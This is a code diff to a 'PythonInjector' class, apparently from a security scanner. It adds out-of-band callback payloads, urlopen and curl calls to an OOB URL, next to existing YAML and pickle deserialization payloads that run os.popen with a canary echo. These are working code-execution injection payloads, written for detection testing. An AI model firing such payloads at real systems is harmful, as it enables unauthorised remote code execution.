@@ -116,6 +116,10 @@ class PythonInjector(BaseInjector):
             "!!python/object/apply:os.popen ['echo " + self.CANARY + "']",
             "!!python/object:__main__.Exploit {}",
             "!!python/object/apply:subprocess.check_output [['echo', '" + self.CANARY + "']]",
+
+            # ── OOB callbacks (blind detection) ──
+            f"__import__('urllib.request').urlopen('{self._get_oob_url()}/python/oob1')",
+            f"__import__('os').popen('curl {self._get_oob_url()}/python/oob2')",
         ]
 
     def analyze_response(
@@ -196,9 +200,11 @@ class PythonInjector(BaseInjector):
         import pickle
         import os
 
+        canary = self.CANARY
+
         class _Exploit:
             def __reduce__(self):
-                return (os.popen, (f"echo EPT_PY_9f3a7c",))
+                return (os.popen, ("echo " + canary,))
 
         raw = pickle.dumps(_Exploit())
         return base64.b64encode(raw).decode()
